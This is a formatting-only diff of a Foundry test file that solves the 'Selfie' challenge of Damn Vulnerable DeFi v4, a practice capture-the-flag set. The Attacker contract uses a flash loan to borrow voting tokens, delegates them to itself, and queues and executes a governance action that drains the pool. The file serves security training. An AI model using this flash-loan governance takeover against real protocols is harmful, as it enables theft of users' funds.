@@ -2,31 +2,43 @@
 // Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
 pragma solidity =0.8.25;
 
-import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
-import {Test, console} from "forge-std/Test.sol";
-import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
-import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
-import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
+import { IERC3156FlashBorrower } from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
+import { Test, console } from "forge-std/Test.sol";
+import { DamnValuableVotes } from "../../src/DamnValuableVotes.sol";
+import { SimpleGovernance } from "../../src/selfie/SimpleGovernance.sol";
+import { SelfiePool } from "../../src/selfie/SelfiePool.sol";
 
 contract Attacker is IERC3156FlashBorrower {
-    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");
+    bytes32 private constant CALLBACK_SUCCESS =
+        keccak256("ERC3156FlashBorrower.onFlashLoan");
     SimpleGovernance private immutable governance;
     SelfiePool private immutable pool;
     address private immutable target;
 
-    constructor(SelfiePool _pool, SimpleGovernance _governance, address _target) {
+    constructor(
+        SelfiePool _pool,
+        SimpleGovernance _governance,
+        address _target
+    ) {
         pool = _pool;
         governance = _governance;
         target = _target;
     }
 
-    function onFlashLoan(address initiator, address token, uint256 amount, uint256 fee, bytes calldata)
-        external
-        returns (bytes32)
-    {
+    function onFlashLoan(
+        address initiator,
+        address token,
+        uint256 amount,
+        uint256 fee,
+        bytes calldata
+    ) external returns (bytes32) {
         DamnValuableVotes(token).approve(msg.sender, amount + fee);
         DamnValuableVotes(token).delegate(address(this));
-        governance.queueAction(address(pool), 0, abi.encodeCall(pool.emergencyExit, (target)));
+        governance.queueAction(
+            address(pool),
+            0,
+            abi.encodeCall(pool.emergencyExit, (target))
+        );
         return CALLBACK_SUCCESS;
     }
 
@@ -36,7 +48,7 @@ contract Attacker is IERC3156FlashBorrower {
     }
 
     function executeRecovery() external {
-        governance.executeAction({actionId: 1});
+        governance.executeAction({ actionId: 1 });
     }
 }
 
@@ -107,6 +119,10 @@ contract SelfieChallenge is Test {
     function _isSolved() private view {
         // Player has taken all tokens from the pool
         assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
-        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
+        assertEq(
+            token.balanceOf(recovery),
+            TOKENS_IN_POOL,
+            "Not enough tokens in recovery account"
+        );
     }
 }
